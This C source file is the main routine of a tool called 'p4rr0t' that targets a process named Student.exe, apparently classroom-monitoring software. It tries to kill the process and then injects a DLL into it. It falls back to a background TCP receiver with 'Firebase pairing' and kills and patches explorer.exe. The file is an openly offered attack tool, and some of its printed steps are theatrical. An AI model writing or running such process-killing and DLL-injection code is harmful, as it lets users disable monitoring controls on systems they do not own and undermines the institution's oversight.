#include "utils.h"
#pragma comment(lib, "shell32.lib")

int main() {
    const char *dllName = "p4rr0t_dll.dll";
    const char *targetProcess = "Student.exe"; // Default target (notepad.exe for testing)

    printf("p4rr0t by 85cs - Exploit by Itelcan3 and franciplay (aka. @MasterSharp3210, @franciplay)\n");
    InjectDLL(targetProcess, dllName);
    printf("\nTARGET: %s\n", targetProcess);
    printf("DLL: %s\n", dllName);

    printf("Starting process kill exploit first...\n");
    KillProcess(targetProcess);

    Sleep(1000);

    DWORD checkPid = FindProcessId(targetProcess);
    if (checkPid != 0) {
        printf("ERROR: Process %s is still running.\n", targetProcess);
        printf("Switching next exploit (DLL Injection)...\n\n");

        printf("Triggering kernel handles for process: %s\n", targetProcess);
        Sleep(1000);
        printf("Attaching DLL %s\n", dllName);
        printf("Injecting DLL %s\n", dllName);
        InjectDLL(targetProcess, dllName);

        printf("\nStarting daemon... Running in background\n");
        Sleep(2000);

        Sleep(1500);
        checkPid = FindProcessId(targetProcess);
        if (checkPid != 0) {
            printf("ERROR: Process %s is still running after DLL injection.\n", targetProcess);
            printf("Switching to integrated TCP socket receiver fallback...\n");

            // Start integrated TCP receiver with Firebase pairing
            StartReceiver("piccione");

        } else {
            printf("Process now closed! Respringing Explorer to patch...\n");
            PatchExplorer();
        }

    } else {
        printf("Process now closed! Respringing Explorer to patch...\n");
        KillProcess("explorer.exe");
        PatchExplorer();
    }

    return 0;
}
